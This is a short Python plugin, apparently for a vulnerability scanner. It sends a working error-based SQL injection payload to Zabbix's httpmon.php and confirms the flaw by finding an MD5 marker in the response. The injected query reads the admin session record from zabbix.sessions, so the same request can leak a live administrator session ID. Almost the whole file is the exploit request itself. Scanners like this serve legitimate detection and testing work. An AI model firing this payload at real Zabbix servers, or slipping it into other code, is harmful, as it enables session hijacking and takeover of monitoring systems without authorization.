#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if service != 'http':
        return
    try:
        payload = "/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29," \
                  "concat%28%28select%28select%20concat%28cast%28concat%28md5('123'),0x7e,userid,0x7e," \
                  "status%29%20as%20char%29,0x7e%29%29%20from%20zabbix.sessions%20where%20status=0%20and%20" \
                  "userid=1%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20" \
                  "information_schema.tables%20group%20by%20x%29a%29"
        url = '%s://%s:%s' % (service, ip, port) + payload

        r = await http_client(ip, port).get(url, timeout=20)
        if r.status_code == 200:
            if r.text.find("202cb962ac59075b964b07152d234b70") >= 0:
                ret = {
                    'alert_group': 'Zabbix SQL Injection',
                    'affects': '%s://%s:%s' % (service, ip, port),
                    'details': 'Zabbix httpmon.php sql injection found:\n\n %s' % url
                }
                return ret
    except Exception as e:
        debug(e)
